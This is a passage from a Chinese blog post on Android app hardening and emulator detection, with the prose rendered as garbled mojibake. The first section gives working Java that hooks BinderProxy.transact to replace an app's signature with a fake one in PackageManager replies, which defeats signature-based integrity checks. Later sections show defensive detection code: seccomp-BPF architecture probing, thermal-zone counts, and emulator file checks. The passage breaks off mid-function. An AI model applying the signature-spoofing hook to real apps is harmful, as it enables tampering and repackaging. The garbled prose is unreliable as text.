&#125; catch (Throwable e) &#123;</span><br><span class="line">        CLog.e(&quot;fail to clear Parcel.sPairedCreators&quot;, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Binder-transact-æ–¹æ³•"><a href="#Binder-transact-æ–¹æ³•" class="headerlink" title="Binder transact æ–¹æ³•"></a>Binder transact æ–¹æ³•</h5><p>æœ‰å¾ˆå¤šå¤§å‚ä¼šè‡ªå·±ä¼ªé€ IPCå’ŒæœåŠ¡ç«¯è¿›è¡Œé€šè®¯ï¼Œç”¨è¿™ç§æ–¹æ³•å¯ä»¥è¿›è¡Œç­¾åçš„ä¿®æ”¹å’Œæ›¿æ¢ï¼Œå®ç°æ€è·¯ä¸»è¦å°±æ˜¯<code>Hook binder</code>é€šè®¯è§£æçš„æ–¹æ³• ã€‚åˆ¤æ–­å¦‚æœä¼ è¾“ç±»å‹æ•°æ®æ˜¯è·å–ç­¾åçš„è¯å°±è¿›è¡Œæ›¿æ¢ ã€‚ä¸»è¦æ€è·¯å°±æ˜¯<code>Hook</code>ä¼ è¾“æ•°æ®çš„â€œæ°´ç®¡â€ï¼Œå¯¹æ°´ç®¡é‡Œé¢çš„å†…å®¹è¿›è¡Œæ›¿æ¢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">RposedHelpers.findAndHookMethod(&quot;android.os.BinderProxy&quot;, // ç›®æ ‡ç±»å</span><br><span class="line">        context.getClassLoader(),  // ç±»åŠ è½½å™¨</span><br><span class="line">        &quot;transact&quot;,                // ç›®æ ‡æ–¹æ³•å</span><br><span class="line">        int.class,</span><br><span class="line">        Parcel.class,</span><br><span class="line">        Parcel.class,</span><br><span class="line">        int.class,</span><br><span class="line">        new RC_MethodHook() &#123; // Hook å›è°ƒé€»è¾‘</span><br><span class="line">            @Override</span><br><span class="line">            protected void afterHookedMethod(MethodHookParam param) &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    Object object = param.thisObject;</span><br><span class="line">                    int id = (int) param.args[0];    // äº‹åŠ¡ç  </span><br><span class="line">                    Parcel write = (Parcel) param.args[1];  // è¯·æ±‚æ•°æ® (data)</span><br><span class="line">                    Parcel out = (Parcel) param.args[2];    // å“åº”æ•°æ® (reply)</span><br><span class="line">                    // forward check</span><br><span class="line">                    if (write == null || out == null) &#123;</span><br><span class="line">                        return;</span><br><span class="line">                    &#125;</span><br><span class="line">                    // prevent recurise call (é˜²æ­¢é€’å½’)</span><br><span class="line">                    if (id == IBinder.INTERFACE_TRANSACTION) &#123;</span><br><span class="line">                        //IBinderåè®®äº‹åŠ¡ä»£ç ï¼šè¯¢é—®äº‹åŠ¡çš„æ”¶ä»¶äººç«¯ä»¥è·å–å…¶è§„èŒƒæ¥å£æè¿°ç¬¦ã€‚</span><br><span class="line">                        return;</span><br><span class="line">                    &#125;</span><br><span class="line"> </span><br><span class="line">                    String desc = (String) RposedHelpers.callMethod(object, &quot;getInterfaceDescriptor&quot;);</span><br><span class="line">                    if (desc == null || !desc.equals(&quot;android.content.pm.IPackageManager&quot;)) &#123; // ç­›é€‰æœåŠ¡</span><br><span class="line">                        return;</span><br><span class="line">                    &#125;</span><br><span class="line">                    if (id == TRANSACTION_getPackageInfo_ID) &#123; // ç­›é€‰ç›®æ ‡æ“ä½œ</span><br><span class="line">                        out.readException();             // è¯»å–å’Œè§£æåŸå§‹ç»“æœ</span><br><span class="line">                        if (0 != out.readInt()) &#123;  // æ£€æŸ¥æ˜¯å¦æœ‰æœ‰æ•ˆçš„ PackageInfo è¿”å›</span><br><span class="line">                            PackageInfo packageInfo = PackageInfo.CREATOR.createFromParcel(out);  // ä» Parcel ä¸­ååºåˆ—åŒ–å‡º PackageInfo å¯¹è±¡  </span><br><span class="line">                            if (packageInfo.packageName.equals(context.getApplicationInfo().packageName)) &#123;</span><br><span class="line">                                if (fakeSignature[0] == null) &#123;</span><br><span class="line">                                    CLog.e(&quot;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; byPassSignature fakeSignature == null&quot;);</span><br><span class="line">                                    System.exit(0);</span><br><span class="line">                                    return;</span><br><span class="line">                                &#125;</span><br><span class="line">                                //CLog.i( &quot;org data size -&gt;  &quot;+out.dataSize());</span><br><span class="line"> </span><br><span class="line">                                if (packageInfo.signatures != null &amp;&amp; packageInfo.signatures.length &gt; 0) &#123; </span><br><span class="line">                                    packageInfo.signatures[0] = fakeSignature[0];</span><br><span class="line">                                    //CLog.i(&quot; byPassSignatureByLSPosed 1 !!&quot;);</span><br><span class="line">                                &#125;</span><br><span class="line">                                // æ ¸å¿ƒ:æ›¿æ¢ç­¾å </span><br><span class="line">                                if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.P) &#123;</span><br><span class="line">                                    if (packageInfo.signingInfo != null) &#123;</span><br><span class="line">                                        Signature[] signaturesArray = packageInfo.signingInfo.getApkContentsSigners();</span><br><span class="line">                                        if (signaturesArray != null &amp;&amp; signaturesArray.length &gt; 0) &#123;</span><br><span class="line">                                            signaturesArray[0] = fakeSignature[0];</span><br><span class="line">                                            //CLog.i( &quot; byPassSignatureByLSPosed 2 !!&quot;);</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                           // å°†ä¿®æ”¹åçš„ç»“æœå†™å› Parcel</span><br><span class="line">                                out.setDataPosition(0);</span><br><span class="line">                                out.setDataSize(0);</span><br><span class="line">                                out.writeNoException();</span><br><span class="line">                                out.writeInt(1);</span><br><span class="line">                                packageInfo.writeToParcel(out, PARCELABLE_WRITE_RETURN_VALUE);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line"> </span><br><span class="line">                        // reset pos é‡ç½®è¯»å†™ä½ç½®</span><br><span class="line">                        out.setDataPosition(0);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                catch (Throwable err) &#123;</span><br><span class="line">                    CLog.e(&quot;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; byPassSignatureByLSPosed error &quot; + err.getMessage());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰å¾ˆå¤šå¾ˆå¥½æ€è·¯çš„ä»£ç  ï¼Œæ¯”å¦‚<code>ISO</code>çº¿ç¨‹å»è¯»å–<code>apk</code>ç­¾åä¿¡æ¯ï¼Œé˜²æ­¢<code>SVC</code>è¢«<code>IO</code>é‡å®šå‘æ‰ ã€‚</p><blockquote><ul><li><strong><code>&quot;android.os.BinderProxy&quot;</code></strong>: è¿™æ˜¯è¦ Hook çš„ç›®æ ‡ç±»ã€‚<code>BinderProxy</code> æ˜¯å®¢æˆ·ç«¯ï¼ˆåº”ç”¨è¿›ç¨‹ï¼‰ä¸­ Binder è¿œç¨‹æœåŠ¡çš„ä¸€ä¸ªä»£ç†å¯¹è±¡ã€‚å½“ä½ çš„åº”ç”¨è°ƒç”¨ä¸€ä¸ªç³»ç»ŸæœåŠ¡ï¼ˆå¦‚ <code>PackageManagerService</code>ï¼‰æ—¶ï¼Œå®é™…ä¸Šæ˜¯è°ƒç”¨äº†æœ¬åœ° <code>BinderProxy</code> å¯¹è±¡çš„æ–¹æ³•</li><li><code>transact</code> æ–¹æ³•æ˜¯ Binder é€šä¿¡çš„æ ¸å¿ƒã€‚æ‰€æœ‰è·¨è¿›ç¨‹çš„æ•°æ®è¯·æ±‚å’Œå“åº”éƒ½ä¼šç»è¿‡è¿™ä¸ªæ–¹æ³•</li><li>åœ¨ç¡®å®šäº†æ˜¯å‘å¾€ <code>PackageManagerService</code> çš„é€šä¿¡åï¼Œæˆ‘ä»¬å†é€šè¿‡äº‹åŠ¡ç  <code>id</code> æ¥åˆ¤æ–­å…·ä½“çš„æ“ä½œï¼Œ<code>TRANSACTION_getPackageInfo_ID</code> (è¿™ä¸ªå¸¸é‡éœ€è¦åœ¨åˆ«å¤„å®šä¹‰) æ˜ç¡®å‘Šè¯‰æˆ‘ä»¬ï¼Œè¿™æ˜¯ä¸€ä¸ªè·å– <code>PackageInfo</code> çš„è¯·æ±‚</li><li><code>PackageInfo.CREATOR.createFromParcel(out)</code>: è¿™æ˜¯å®‰å“ <code>Parcelable</code> æœºåˆ¶çš„æ ‡å‡†ç”¨æ³•ï¼Œå°† <code>Parcel</code> ä¸­çš„äºŒè¿›åˆ¶æ•°æ®ååºåˆ—åŒ–æˆä¸€ä¸ª <code>PackageInfo</code> Java å¯¹è±¡</li><li><code>packageInfo.signatures[0] = fakeSignature[0]</code>: åœ¨æ—§ç‰ˆ Android ä¸­ï¼Œç­¾åä¿¡æ¯ç›´æ¥å­˜å‚¨åœ¨ <code>PackageInfo</code> çš„ <code>signatures</code> æ•°ç»„é‡Œã€‚è¿™é‡Œç›´æ¥å°†ç¬¬ä¸€ä¸ªç­¾åæ›¿æ¢æˆæˆ‘ä»¬é¢„å…ˆå‡†å¤‡å¥½çš„ <code>fakeSignature</code></li><li><code>if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.P)</code>: ä» Android 9 (Pie) å¼€å§‹ï¼Œå¼•å…¥äº† <code>SigningInfo</code> ç±»æ¥æ›´å¥½åœ°æ”¯æŒå¤šç­¾åå’Œç­¾åè½®æ¢ã€‚å› æ­¤ï¼Œä¸ºäº†å…¼å®¹æ–°ç³»ç»Ÿï¼Œå¿…é¡»åŒæ—¶ä¿®æ”¹ <code>SigningInfo</code> é‡Œé¢çš„ç­¾åä¿¡æ¯ã€‚è¿™æ®µä»£ç å¤„ç†äº†é«˜ç‰ˆæœ¬çš„å…¼å®¹æ€§é—®é¢˜</li></ul></blockquote><h3 id="æ¨¡æ‹Ÿå™¨æ£€æµ‹-1"><a href="#æ¨¡æ‹Ÿå™¨æ£€æµ‹-1" class="headerlink" title="æ¨¡æ‹Ÿå™¨æ£€æµ‹"></a>æ¨¡æ‹Ÿå™¨æ£€æµ‹</h3><p>Javaå±‚åŸºç¡€çš„è·å–apiæ¶æ„å•¥çš„</p><h4 id="Seccompæ£€æµ‹æ¶æ„"><a href="#Seccompæ£€æµ‹æ¶æ„" class="headerlink" title="Seccompæ£€æµ‹æ¶æ„"></a>Seccompæ£€æµ‹æ¶æ„</h4><p>ä¸»è¦æ€è·¯æ¥è‡ªBå“¥ ï¼Œæ„Ÿè°¢Bå“¥ ï¼Œå…ˆå®‰è£…<code>seccomp</code>æ¶å­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">void install_check_arch_seccomp() &#123;</span><br><span class="line">    struct sock_filter filter[15] = &#123;</span><br><span class="line">            BPF_STMT(BPF_LD + BPF_W + BPF_ABS, (uint32_t) offsetof(struct seccomp_data, nr)),</span><br><span class="line">            BPF_JUMP(BPF_JMP + BPF_JEQ, __NR_getpid, 0, 12),</span><br><span class="line">            BPF_STMT(BPF_LD + BPF_W + BPF_ABS, (uint32_t) offsetof(struct seccomp_data, args[0])),</span><br><span class="line">            BPF_JUMP(BPF_JMP + BPF_JEQ, DetectX86Flag, 0, 10),</span><br><span class="line">            BPF_STMT(BPF_LD + BPF_W + BPF_ABS, (uint32_t) offsetof(struct seccomp_data, arch)),</span><br><span class="line">            BPF_JUMP(BPF_JMP + BPF_JEQ, AUDIT_ARCH_X86_64, 0, 1),</span><br><span class="line">            BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ERRNO | (864 &amp; SECCOMP_RET_DATA)),</span><br><span class="line">            BPF_JUMP(BPF_JMP + BPF_JEQ, AUDIT_ARCH_I386, 0, 1),</span><br><span class="line">            BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ERRNO | (386 &amp; SECCOMP_RET_DATA)),</span><br><span class="line">            BPF_JUMP(BPF_JMP + BPF_JEQ, AUDIT_ARCH_ARM, 0, 1),</span><br><span class="line">            BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ERRNO | (0xA32 &amp; SECCOMP_RET_DATA)),</span><br><span class="line">            BPF_JUMP(BPF_JMP + BPF_JEQ, AUDIT_ARCH_AARCH64, 0, 1),</span><br><span class="line">            BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ERRNO | (0xA64 &amp; SECCOMP_RET_DATA)),</span><br><span class="line">            BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ERRNO | (6 &amp; SECCOMP_RET_DATA)),</span><br><span class="line">            BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW)</span><br><span class="line"> </span><br><span class="line">    &#125;;</span><br><span class="line">    struct sock_fprog program = &#123;</span><br><span class="line">            .len = (unsigned short) (sizeof(filter) / sizeof(filter[0])),</span><br><span class="line">            .filter = filter</span><br><span class="line">    &#125;;</span><br><span class="line">    errno = 0;</span><br><span class="line">    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)) &#123;</span><br><span class="line">        LOG(ERROR) &lt;&lt; &quot;prctl(PR_SET_NO_NEW_PRIVS) &quot; &lt;&lt; strerror(errno);</span><br><span class="line">    &#125;</span><br><span class="line">    errno = 0;</span><br><span class="line">    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;program)) &#123;</span><br><span class="line">        LOG(ERROR) &lt;&lt; &quot;prctl(PR_SET_SECCOMP) &quot; &lt;&lt; strerror(errno);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><ol><li><strong>Seccomp (Secure Computing Mode)</strong>: è¿™æ˜¯Linuxå†…æ ¸çš„ä¸€é¡¹å®‰å…¨åŠŸèƒ½ï¼Œç”¨äºé™åˆ¶è¿›ç¨‹å¯ä»¥è°ƒç”¨çš„ç³»ç»Ÿè°ƒç”¨ï¼ˆsyscallï¼‰ã€‚å®ƒæœ‰ä¸¤ç§æ¨¡å¼ï¼š<ul><li><code>SECCOMP_MODE_STRICT</code>: æåº¦ä¸¥æ ¼ï¼Œåªå…è®¸ <code>read</code>, <code>write</code>, <code>sigreturn</code>, <code>exit</code> å››ä¸ªç³»ç»Ÿè°ƒç”¨ã€‚</li><li><code>SECCOMP_MODE_FILTER</code>: å…è®¸ç”¨æˆ·æä¾›ä¸€ä¸ª BPF ç¨‹åºï¼Œå†…æ ¸ä¼šå¯¹è¿›ç¨‹çš„æ¯ä¸€æ¬¡ç³»ç»Ÿè°ƒç”¨éƒ½è¿è¡Œè¿™ä¸ª BPF ç¨‹åºï¼Œç”±ç¨‹åºæ¥å†³å®šæ˜¯å…è®¸ã€æ‹’ç»ã€è¿˜æ˜¯æ‰§è¡Œå…¶ä»–æ“ä½œã€‚æœ¬ä»£ç ä½¿ç”¨çš„å°±æ˜¯è¿™ç§æ¨¡å¼ã€‚</li></ul></li><li><strong>BPF (Berkeley Packet Filter)</strong>: BPF æ˜¯ä¸€ç§åœ¨å†…æ ¸ä¸­è¿è¡Œçš„ã€åŠŸèƒ½å¼ºå¤§çš„è™šæ‹Ÿæœºã€‚è™½ç„¶å®ƒæœ€åˆæ˜¯ä¸ºè¿‡æ»¤ç½‘ç»œæ•°æ®åŒ…è€Œè®¾è®¡çš„ï¼Œä½†ç°åœ¨å·²è¢«å¹¿æ³›ç”¨äºå†…æ ¸çš„å„ä¸ªå­ç³»ç»Ÿï¼ŒåŒ…æ‹¬ seccompã€‚å®ƒæ‰§è¡Œä¸€ç»„ç®€å•çš„æŒ‡ä»¤ï¼ˆBPFå­—èŠ‚ç ï¼‰ï¼Œå¯¹è¾“å…¥æ•°æ®è¿›è¡Œåˆ¤æ–­ã€‚åœ¨ seccomp çš„ä¸Šä¸‹æ–‡ä¸­ï¼Œè¿™ä¸ªâ€œè¾“å…¥æ•°æ®â€å°±æ˜¯ <code>struct seccomp_data</code>ï¼ŒåŒ…å«äº†å½“å‰ç³»ç»Ÿè°ƒç”¨çš„æ‰€æœ‰ä¿¡æ¯ã€‚</li><li><strong><code>prctl()</code> ç³»ç»Ÿè°ƒç”¨</strong>: è¿™æ˜¯ä¸€ä¸ªç”¨äºæ§åˆ¶è¿›ç¨‹è¡Œä¸ºçš„é€šç”¨ç³»ç»Ÿè°ƒç”¨ã€‚ä»£ç ä¸­ç”¨åˆ°äº†å®ƒçš„ä¸¤ä¸ªé€‰é¡¹ï¼š<ul><li><code>PR_SET_NO_NEW_PRIVS</code>: è¿™æ˜¯å®‰è£… seccomp è¿‡æ»¤å™¨å‰çš„<strong>å…³é”®å®‰å…¨æ­¥éª¤</strong>ã€‚å°†å…¶è®¾ç½®ä¸º 1 åï¼Œå½“å‰è¿›ç¨‹åŠå…¶å­è¿›ç¨‹å°†æ— æ³•é€šè¿‡ <code>execve</code> ç­‰æ–¹å¼è·å¾—æ¯”å½“å‰æ›´é«˜çš„æƒé™ï¼ˆä¾‹å¦‚ï¼Œé€šè¿‡æ‰§è¡Œ SUID ç¨‹åºï¼‰ã€‚è¿™å¯ä»¥é˜²æ­¢æ¶æ„ä»£ç åˆ©ç”¨æ¼æ´æ¥ç»•è¿‡ seccomp é™åˆ¶ã€‚</li><li><code>PR_SET_SECCOMP</code>: ç”¨äºå®é™…å®‰è£… seccomp è¿‡æ»¤å™¨ã€‚</li></ul></li></ol></blockquote><p>æ€»ç»“ï¼šè¿™æ®µä»£ç é€šè¿‡ Seccomp-BPF å®ç°äº†ä¸€ä¸ªéå¸¸è§„ä½†é«˜æ•ˆçš„æ¶æ„æ£€æµ‹æœºåˆ¶ã€‚å®ƒé€‰æ‹©äº†ä¸€ä¸ªå‡ ä¹æ— å®³çš„ç³»ç»Ÿè°ƒç”¨ (<code>getpid</code>)ï¼Œå¹¶ä¸ºå…¶å¢åŠ äº†ä¸€ä¸ªâ€œéšè—åŠŸèƒ½â€ï¼šå½“ä»¥ç‰¹å®šæ–¹å¼è°ƒç”¨æ—¶ï¼Œå®ƒä¸å†è¿”å›è¿›ç¨‹IDï¼Œè€Œæ˜¯é€šè¿‡è¿”å›ä¸€ä¸ªç‰¹å®šçš„ <code>errno</code> æ¥<strong>æŠ¥å‘ŠCPUæ¶æ„</strong>ã€‚è¿™ç§æ–¹æ³•åœ¨é«˜åº¦æ²™ç®±åŒ–çš„ç¯å¢ƒä¸­éå¸¸æœ‰ç”¨ï¼Œå› ä¸ºåœ¨è¿™äº›ç¯å¢ƒä¸­ï¼Œåƒæ‰§è¡Œ <code>uname</code> å‘½ä»¤æˆ–è¯»å– <code>/proc</code> æ–‡ä»¶ç³»ç»Ÿç­‰å¸¸è§„çš„æ£€æµ‹æ–¹æ³•å¯èƒ½éƒ½å·²è¢«ç¦æ­¢ã€‚</p><p>é…åˆä¸Šé¢çš„ä»£ç  ã€‚å¯åŠ¨è°ƒç”¨<code>getpid</code>ï¼Œ ä¸Šé¢çš„æ¶å­ä¼šå¯¹<code>getpid</code>å‡½æ•°è¿›è¡Œæ‹¦æˆª ï¼Œç„¶åæ¶æ„è¿›è¡Œåˆ¤æ–­ ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">string check_arch_by_seccomp() &#123;</span><br><span class="line">    if (get_sdk_level() &lt; __ANDROID_API_N_MR1__)&#123;</span><br><span class="line">        return &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    errno = 0;</span><br><span class="line">    syscall(__NR_getpid, DetectX86Flag);</span><br><span class="line">    if (errno == 386) &#123;</span><br><span class="line">        return &quot;I386è®¾å¤‡&quot;;</span><br><span class="line">    &#125; else if (errno == 864) &#123;</span><br><span class="line">        return &quot;X86_64è®¾å¤‡&quot;;</span><br><span class="line">    &#125; else if (errno == 0xA32 || errno == 0xA64) &#123;</span><br><span class="line">        return &quot;&quot;;</span><br><span class="line">    &#125;else if (errno == 0) &#123;</span><br><span class="line">        //å¯èƒ½æ˜¯æ²¡æœ‰å¼€å¯seccomp</span><br><span class="line">        return &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    return (&quot;ç–‘ä¼¼X86æ¨¡æ‹Ÿå™¨è®¾å¤‡&quot;+ to_string(errno));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="æ£€æµ‹æ¸©åº¦æŒ‚è½½æ–‡ä»¶"><a href="#æ£€æµ‹æ¸©åº¦æŒ‚è½½æ–‡ä»¶" class="headerlink" title="æ£€æµ‹æ¸©åº¦æŒ‚è½½æ–‡ä»¶"></a><strong>æ£€æµ‹æ¸©åº¦æŒ‚è½½æ–‡ä»¶</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">int thermal_check() &#123;</span><br><span class="line">    DIR *dir_ptr;</span><br><span class="line">    int count = 0;</span><br><span class="line">    struct dirent *entry;</span><br><span class="line">    if ((dir_ptr = opendir(&quot;/sys/class/thermal/&quot;)) != nullptr) &#123;</span><br><span class="line">        while ((entry = readdir(dir_ptr))) &#123;</span><br><span class="line">            if (!strcmp(entry-&gt;d_name, &quot;.&quot;) || !strcmp(entry-&gt;d_name, &quot;..&quot;)) &#123;</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line">            char *tmp = entry-&gt;d_name;</span><br><span class="line">            if (strstr(tmp, &quot;thermal_zone&quot;) != nullptr) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        closedir(dir_ptr);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        count = -1;</span><br><span class="line">    &#125;</span><br><span class="line">    return count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="æ¨¡æ‹Ÿå™¨ç‰¹å¾æ–‡ä»¶"><a href="#æ¨¡æ‹Ÿå™¨ç‰¹å¾æ–‡ä»¶" class="headerlink" title="æ¨¡æ‹Ÿå™¨ç‰¹å¾æ–‡ä»¶"></a><strong>æ¨¡æ‹Ÿå™¨ç‰¹å¾æ–‡ä»¶</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">string simulator_files_check() &#123;</span><br><span class="line">    if (file_exist(&quot;/system/bin/androVM-prop&quot;)) &#123;//æ£€æµ‹androidVM</span><br><span class="line">        return &quot;/system/bin/androVM-prop&quot;;</span><br><span class="line">    &#125; else if (file_exist(&quot;/system/bin/microvirt-prop&quot;)) &#123;//æ£€æµ‹é€é¥æ¨¡æ‹Ÿå™¨--æ–°ç‰ˆæœ¬æ‰¾ä¸åˆ°ç‰¹å¾</span><br><span class="line">        return &quot;/system/bin/microvirt-prop&quot;;</span><br><span class="line">    &#125; else if (file_exist(&quot;/system/lib/libdroid4x.so&quot;)) &#123;//æ£€æµ‹æµ·é©¬æ¨¡æ‹Ÿå™¨</span><br><span class="line">        return &quot;/system/lib/libdroid4x.so&quot;;</span><br><span class="line">    &#125; else if (file_exist(&quot;/system/bin/windroyed&quot;)) &#123;//æ£€æµ‹æ–‡å“çˆ·æ¨¡æ‹Ÿå™¨</span><br><span class="line">        return &quot;/system/bin/windroyed&quot;;</span><br><span class="line">    &#125; else if (file_exist(&quot;/system/bin/nox-prop&quot;)) &#123;//æ£€æµ‹å¤œç¥æ¨¡æ‹Ÿå™¨--æŸäº›ç‰ˆæœ¬æ‰¾ä¸åˆ°ç‰¹å¾</span><br><span class="line">        return &quot;/system/bin/nox-prop&quot;;</span><br><span class="line">    &#125; else if (file_exist(&quot;system/lib/libnoxspeedup.so&quot;)) &#123;//æ£€æµ‹å¤œç¥æ¨¡æ‹Ÿå™¨</span><br><span class="line">        return &quot;system/lib/libnoxspeedup.so&quot;;</span><br><span class="line">    &#125; else if (file_exist(&quot;/system/bin/ttVM-prop&quot;)) &#123;//æ£€æµ‹å¤©å¤©æ¨¡æ‹Ÿå™¨</span><br><span class="line">        return &quot;/system/bin/ttVM-prop&quot;;</span><br><span class="line">    &#125; else if (file_exist(&quot;/data/.bluestacks.prop&quot;)) &#123;//æ£€æµ‹bluestacksæ¨¡æ‹Ÿå™¨  51æ¨¡æ‹Ÿå™¨</span><br><span class="line">        return &quot;/data/.bluestacks.prop&quot;;</span><br><span class="line">    &#125; else if (file_exist(&quot;/system/bin/duosconfig&quot;)) &#123;//æ£€æµ‹AMIDuOSæ¨¡æ‹Ÿå™¨</span><br><span class="line">        return &quot;/system/bin/duosconfig&quot;;</span><br><span class="line">    &#125; else if (file_exist(&quot;/system/etc/xxzs_prop.sh&quot;)) &#123;//æ£€æµ‹æ˜Ÿæ˜Ÿæ¨¡æ‹Ÿå™¨</span><br><span class="line">        return &quot;/system/etc/xxzs_prop.sh&quot;;</span><br><span class="line">    &#125; else if (file_exist(&quot;/system/etc/mumu-configs/device-prop-configs/mumu.config&quot;)) &#123;//ç½‘æ˜“MuMuæ¨¡æ‹Ÿå™¨</span><br><span class="line">        return &quot;/system/etc/mumu-configs/device-prop-configs/mumu.config&quot;;</span><br><span class="line">    &#125; else if (file_exist(&quot;/system/priv-app/ldAppStore&quot;)) &#123;//é›·ç”µæ¨¡æ‹Ÿå™¨</span><br><span class="line">        return &quot;/system/priv-app/ldAppStore&quot;;</span><br><span class="line">    &#125; else if (file_exist(&quot;system/bin/ldinit&quot;) &amp;&amp; file_exist(&quot;system/bin/ldmountsf&quot;)) &#123;//é›·ç”µæ¨¡æ‹Ÿå™¨</span><br><span class="line">        return &quot;system/bin/ldinit&quot;;</span><br><span class="line">    &#125; else if (file_exist(&quot;/system/app/AntStore&quot;) &amp;&amp; file_exist(&quot;/system/app/AntLauncher&quot;)) &#123;//å°èšæ¨¡æ‹Ÿå™¨</span><br><span class="line">        return &quot;/system/app/AntStore&quot;;</span><br><span class="line">    &#125; 